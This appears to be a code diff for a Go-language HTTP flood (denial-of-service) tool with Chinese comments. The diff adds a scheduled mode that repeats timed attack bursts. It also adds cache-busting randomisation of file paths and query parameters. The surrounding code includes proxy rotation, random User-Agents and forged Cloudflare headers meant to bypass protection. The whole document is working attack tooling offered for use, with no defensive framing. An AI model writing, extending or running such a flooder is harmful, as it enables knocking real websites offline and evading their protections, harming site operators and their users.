@@ -32,6 +32,9 @@ type Config struct {
 	CFBypass      bool
 	RandomPath    bool
 	RandomParams  bool
+	Schedule      bool
+	ScheduleInterval int // 定时执行间隔（分钟）
+	ScheduleDuration  int // 每次执行时长（分钟）
 }
 
 // 统计信息
@@ -74,26 +77,36 @@ func main() {
 		fmt.Printf("代理数: 0 (直连模式)\n")
 	}
 	fmt.Printf("CF绕过: %v\n", config.CFBypass)
+	if config.Schedule {
+		fmt.Printf("定时执行: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
+	}
 	
 	// 启动统计协程
 	go statsReporter()
 	
 	// 启动攻击
-	startAttack(config)
+	if config.Schedule {
+		startScheduledAttack(config)
+	} else {
+		startAttack(config)
+	}
 }
 
 func parseArgs() *Config {
 	config := &Config{
-		TargetURL:     "https://example.com",
-		Mode:          "get",
-		Threads:       1000,
-		RPS:           5000,
-		Duration:      60,
-		Timeout:       10,
-		ProxyFile:     "socks5.txt",
-		CFBypass:      true,
-		RandomPath:    true,
-		RandomParams:  true,
+		TargetURL:        "https://example.com",
+		Mode:             "post",
+		Threads:          100,
+		RPS:              1000,
+		Duration:         60,
+		Timeout:          10,
+		ProxyFile:        "socks5.txt",
+		CFBypass:         true,
+		RandomPath:       true,
+		RandomParams:     true,
+		Schedule:         false,
+		ScheduleInterval: 10, // 默认10分钟间隔
+		ScheduleDuration: 20, // 默认20分钟执行时长
 	}
 	
 	// 解析命令行参数
@@ -107,6 +120,9 @@ func parseArgs() *Config {
 	flag.BoolVar(&config.CFBypass, "cf-bypass", config.CFBypass, "启用CF绕过")
 	flag.BoolVar(&config.RandomPath, "random-path", config.RandomPath, "随机路径")
 	flag.BoolVar(&config.RandomParams, "random-params", config.RandomParams, "随机参数")
+	flag.BoolVar(&config.Schedule, "schedule", config.Schedule, "启用定时执行")
+	flag.IntVar(&config.ScheduleInterval, "schedule-interval", config.ScheduleInterval, "定时执行间隔（分钟）")
+	flag.IntVar(&config.ScheduleDuration, "schedule-duration", config.ScheduleDuration, "每次执行时长（分钟）")
 	flag.Parse()
 	
 	// 如果还有位置参数，使用它们
@@ -180,6 +196,56 @@ func startAttack(config *Config) {
 	printFinalStats()
 }
 
+func startScheduledAttack(config *Config) {
+	fmt.Println("🕐 启动定时攻击模式...")
+	
+	// 立即执行第一次攻击
+	fmt.Println("🚀 开始第一次攻击...")
+	executeAttack(config, config.ScheduleDuration)
+	
+	// 创建定时器
+	ticker := time.NewTicker(time.Duration(config.ScheduleInterval) * time.Minute)
+	defer ticker.Stop()
+	
+	// 定时执行
+	for range ticker.C {
+		fmt.Printf("🕐 定时器触发，开始新一轮攻击...\n")
+		executeAttack(config, config.ScheduleDuration)
+	}
+}
+
+func executeAttack(config *Config, durationMinutes int) {
+	// 创建限流器
+	rateLimiter := time.NewTicker(time.Second / time.Duration(config.RPS))
+	defer rateLimiter.Stop()
+	
+	// 创建done通道
+	done := make(chan struct{})
+	
+	// 启动工作协程
+	var wg sync.WaitGroup
+	for i := 0; i < config.Threads; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			worker(config, rateLimiter.C, done)
+		}()
+	}
+	
+	// 等待指定时长
+	duration := time.Duration(durationMinutes) * time.Minute
+	fmt.Printf("⏰ 攻击将持续 %d 分钟...\n", durationMinutes)
+	time.Sleep(duration)
+	
+	fmt.Printf("⏰ 本轮攻击结束，等待所有请求完成...\n")
+	close(done) // 通知所有worker停止
+	wg.Wait()
+	
+	// 打印本轮统计
+	printFinalStats()
+	fmt.Printf("💤 等待 %d 分钟后开始下一轮攻击...\n", config.ScheduleInterval)
+}
+
 func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
 	for {
 		select {
@@ -200,7 +266,7 @@ func worker(config *Config, rateLimit <-chan time.Time, done <-chan struct{}) {
 
 func performAttack(config *Config) bool {
 	// 解析URL
-	_, err := url.Parse(config.TargetURL)
+	baseURL, err := url.Parse(config.TargetURL)
 	if err != nil {
 		return false
 	}
@@ -215,17 +281,20 @@ func performAttack(config *Config) bool {
 		client = createDirectClient(config.Timeout)
 	}
 	
+	// 构建最终URL
+	finalURL := buildFinalURL(baseURL, config)
+	
 	// 创建请求
 	var req *http.Request
 	switch config.Mode {
 	case "get":
-		req, err = http.NewRequest("GET", config.TargetURL, nil)
+		req, err = http.NewRequest("GET", finalURL, nil)
 	case "post":
-		req, err = http.NewRequest("POST", config.TargetURL, strings.NewReader("data=test"))
+		req, err = http.NewRequest("POST", finalURL, strings.NewReader("data=test"))
 	case "head":
-		req, err = http.NewRequest("HEAD", config.TargetURL, nil)
+		req, err = http.NewRequest("HEAD", finalURL, nil)
 	default:
-		req, err = http.NewRequest("GET", config.TargetURL, nil)
+		req, err = http.NewRequest("GET", finalURL, nil)
 	}
 	
 	if err != nil {
@@ -317,6 +386,23 @@ func createDirectClient(timeout int) *http.Client {
 	}
 }
 
+func buildFinalURL(baseURL *url.URL, config *Config) string {
+	// 复制URL
+	finalURL := *baseURL
+	
+	// 随机路径 - 如果是文件，添加随机数
+	if config.RandomPath {
+		finalURL.Path = generateRandomPathForFile(finalURL.Path)
+	}
+	
+	// 随机参数
+	if config.RandomParams {
+		finalURL.RawQuery = generateRandomParams()
+	}
+	
+	return finalURL.String()
+}
+
 func setAdvancedHeaders(req *http.Request, config *Config) {
 	// 随机User-Agent - 使用第三方库生成
 	userAgent := fakeuseragent.Random()
@@ -334,15 +420,6 @@ func setAdvancedHeaders(req *http.Request, config *Config) {
 		req.Header.Set("CF-Ray", generateCFRay())
 		req.Header.Set("CF-Visitor", `{"scheme":"https"}`)
 	}
-	
-	// 随机路径和参数
-	if config.RandomPath {
-		req.URL.Path = generateRandomPath()
-	}
-	
-	if config.RandomParams {
-		req.URL.RawQuery = generateRandomParams()
-	}
 }
 
 func generateCFRay() string {
@@ -355,30 +432,23 @@ func generateCFRay() string {
 	return string(result)
 }
 
-func generateRandomPath() string {
-	paths := []string{
-		"/",
-		"/index.html",
-		"/home",
-		"/about",
-		"/contact",
-		"/products",
-		"/services",
-		"/blog",
-		"/news",
-		"/api/v1/status",
-		"/api/v2/users",
-		"/api/v3/data",
-		"/admin",
-		"/dashboard",
-		"/profile",
-		"/settings",
-		"/login",
-		"/register",
-		"/search",
-		"/category",
+func generateRandomPathForFile(originalPath string) string {
+	// 检查是否是文件（有扩展名）
+	if strings.Contains(originalPath, ".") && !strings.HasSuffix(originalPath, "/") {
+		// 分离文件名和扩展名
+		lastDot := strings.LastIndex(originalPath, ".")
+		if lastDot > 0 {
+			baseName := originalPath[:lastDot]
+			extension := originalPath[lastDot:]
+			
+			// 添加随机数
+			randomNum := rand.Intn(10000)
+			return fmt.Sprintf("%s_%d%s", baseName, randomNum, extension)
+		}
 	}
-	return paths[rand.Intn(len(paths))]
+	
+	// 如果不是文件，返回原始路径
+	return originalPath
 }
 
 func generateRandomParams() string {
